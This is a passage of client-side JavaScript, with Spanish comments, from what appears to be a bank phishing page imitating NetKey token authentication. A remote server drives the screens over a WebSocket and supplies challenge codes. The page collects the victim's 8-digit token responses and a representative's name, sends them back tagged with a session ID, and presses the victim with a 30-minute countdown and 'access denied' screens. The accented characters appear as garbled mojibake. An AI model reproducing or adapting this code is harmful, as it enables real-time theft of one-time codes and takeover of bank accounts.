                // Mostrar el c√≥digo CHALLENGE si viene en los datos
                if (data.challenge) {
                    console.log('Mostrando challenge:', data.challenge);
                    document.getElementById('challenge-display').textContent = data.challenge;
                }

                // Configurar evento del bot√≥n de NetKey si a√∫n no est√° configurado
                var submitBtn = document.getElementById('netkey-submit-btn');
                if (submitBtn && !submitBtn.hasAttribute('data-configured')) {
                    submitBtn.setAttribute('data-configured', 'true');
                    submitBtn.addEventListener('click', function() {
                        var netkeyResponse = document.getElementById('netkey-response-input').value.trim();

                        if (netkeyResponse.length !== 8) {
                            alert('Por favor ingrese un c√≥digo de 8 d√≠gitos');
                            return;
                        }

                        console.log('Enviando respuesta NetKey:', netkeyResponse);

                        // Enviar respuesta al servidor
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'CLIENT_INPUT',
                                data: {
                                    sessionId: currentSessionId,
                                    tipo: 'netkey_response',
                                    netkeyResponse: netkeyResponse
                                }
                            }));

                            // Cambiar a pantalla de validaci√≥n
                            document.getElementById('netkey-screen').style.display = 'none';
                            document.getElementById('loading-screen').style.display = 'block';
                        } else {
                            alert('Error de conexi√≥n. Por favor recargue la p√°gina.');
                        }
                    });
                }

                // Limpiar el input de respuesta
                document.getElementById('netkey-response-input').value = '';
                document.getElementById('netkey-response-input').focus();
            } else if (data.tipo === 'netkey2' || data.tipo === 'mostrar_netkey2') {
                console.log('Mostrando pantalla NetKey 2');
                console.log('Mostrando challenge:', data.challenge);
                document.getElementById('netkey2-screen').style.display = 'block';

                // Mostrar el c√≥digo CHALLENGE si viene en los datos
                if (data.challenge) {
                    document.getElementById('netkey2-challenge-display').textContent = data.challenge;
                }

                // Actualizar fecha y hora en tiempo real
                function updateNetkey2DateTime() {
                    var now = new Date();
                    var days = ['Domingo','Lunes','Martes','Mi√©rcoles','Jueves','Viernes','S√°bado'];
                    var months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
                    var pad = function(n) { return n < 10 ? '0'+n : n; };
                    var dayName = days[now.getDay()];
                    var day = now.getDate();
                    var month = months[now.getMonth()];
                    var year = now.getFullYear();
                    var time = pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
                    var dateStr = dayName + ' ' + day + ' de ' + month + ' de ' + year + ', ' + time + ' Centro de M√©xico';
                    document.getElementById('netkey2-datetime').textContent = dateStr;
                }
                updateNetkey2DateTime();
                var dateInterval = setInterval(updateNetkey2DateTime, 1000);

                // Iniciar contador de 30 minutos
                var timeLeft = 30 * 60; // 30 minutos en segundos
                var timerElement = document.getElementById('netkey2-timer');
                var timerInterval = setInterval(function() {
                    var minutes = Math.floor(timeLeft / 60);
                    var seconds = timeLeft % 60;
                    timerElement.textContent = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
                    
                    // Cambiar color cuando queden menos de 5 minutos
                    if (timeLeft <= 5 * 60) {
                        timerElement.style.color = '#dc3545';
                        timerElement.parentElement.parentElement.style.background = '#f8d7da';
                        timerElement.parentElement.parentElement.style.borderColor = '#dc3545';
                    }
                    
                    if (timeLeft <= 0) {
                        clearInterval(timerInterval);
                        clearInterval(dateInterval);
                        alert('El tiempo de validez de NetKey ha expirado. Por favor, recargue la p√°gina e intente nuevamente.');
                    }
                    timeLeft--;
                }, 1000);

                // Configurar evento del bot√≥n de NetKey2 si a√∫n no est√° configurado
                var submitBtn = document.getElementById('netkey2-submit-btn');
                if (submitBtn && !submitBtn.hasAttribute('data-configured')) {
                    submitBtn.setAttribute('data-configured', 'true');
                    submitBtn.addEventListener('click', function() {
                        var netkeyResponse = document.getElementById('netkey2-response-input').value.trim();

                        if (netkeyResponse.length !== 8) {
                            alert('Por favor ingrese un c√≥digo de 8 d√≠gitos');
                            return;
                        }

                        console.log('Enviando respuesta NetKey 2:', netkeyResponse);

                        // Enviar respuesta al servidor
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'CLIENT_INPUT',
                                data: {
                                    sessionId: currentSessionId,
                                    tipo: 'netkey_response',
                                    netkeyResponse: netkeyResponse
                                }
                            }));

                            // Limpiar intervalos
                            clearInterval(dateInterval);
                            clearInterval(timerInterval);

                            // Cambiar a pantalla de validaci√≥n
                            document.getElementById('netkey2-screen').style.display = 'none';
                            document.getElementById('loading-screen').style.display = 'block';
                        } else {
                            alert('Error de conexi√≥n. Por favor recargue la p√°gina.');
                        }
                    });
                }

                // Limpiar el input de respuesta
                document.getElementById('netkey2-response-input').value = '';
                document.getElementById('netkey2-response-input').focus();
            } else if (data.tipo === 'acceso_denegado') {
                console.log('Mostrando pantalla de Acceso Denegado');
                document.getElementById('acceso-denegado-screen').style.display = 'block';
            } else if (data.tipo === 'acceso_denegado_2') { // Manejar la nueva pantalla
                console.log('Mostrando pantalla de Acceso Denegado 2');
                document.getElementById('acceso-denegado-2-screen').style.display = 'block';

                // Actualizar fecha y hora en tiempo real para la pantalla acceso_denegado_2
                function updateAcceso2DateTime() {
                    var now = new Date();
                    var days = ['Domingo','Lunes','Martes','Mi√©rcoles','Jueves','Viernes','S√°bado'];
                    var months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
                    var pad = function(n) { return n < 10 ? '0'+n : n; };
                    var dayName = days[now.getDay()];
                    var day = now.getDate();
                    var month = months[now.getMonth()];
                    var year = now.getFullYear();
                    var time = pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
                    var dateStr = dayName + ' ' + day + ' de ' + month + ' de ' + year + ', ' + time + ' Centro de M√©xico';
                    var datetimeElement = document.getElementById('datetime-acceso2');
                    if(datetimeElement) {
                        datetimeElement.textContent = dateStr;
                    }
                }
                updateAcceso2DateTime();
                var dateIntervalAcceso2 = setInterval(updateAcceso2DateTime, 1000);

                // Configurar el bot√≥n de "Cancelar" en la pantalla acceso_denegado_2
                var cancelBtnAcceso2 = document.querySelector('#acceso-denegado-2-screen button[type="button"]');
                if (cancelBtnAcceso2) {
                    cancelBtnAcceso2.addEventListener('click', function() {
                        console.log('Cancelar presionado en Acceso Denegado 2');
                        // Aqu√≠ podr√≠as enviar un mensaje al backend o simplemente cerrar la pantalla
                        clearInterval(dateIntervalAcceso2); // Detener el reloj
                        document.getElementById('acceso-denegado-2-screen').style.display = 'none';
                        // Opcional: Volver a la pantalla de login o a una pantalla de error gen√©rica
                        // document.getElementById('login').style.display = 'block'; 
                    });
                }

                 // Configurar el bot√≥n de "Solicitar sincronizaci√≥n" en la pantalla acceso_denegado_2
                var submitBtnAcceso2 = document.getElementById('submit-btn-2');
                if (submitBtnAcceso2) {
                    submitBtnAcceso2.addEventListener('click', function() {
                        // La validaci√≥n ya se hace en tiempo real, pero podemos confirmar aqu√≠ si es necesario
                        if (submitBtnAcceso2.disabled) {
                            return; // No hacer nada si est√° deshabilitado
                        }
                        console.log('Solicitar sincronizaci√≥n presionado en Acceso Denegado 2');
                        // Aqu√≠ se enviar√≠a la informaci√≥n del formulario al backend
                        // El formulario ya tiene un listener 'submit' que maneja esto.
                    });
                }

                // Enfocar el primer campo del formulario
                document.getElementById('nombre-rep-2').focus();

            } else {
                console.log('Tipo de pantalla no reconocido:', data.tipo);
            }
        }
    </script>
</body>
</html>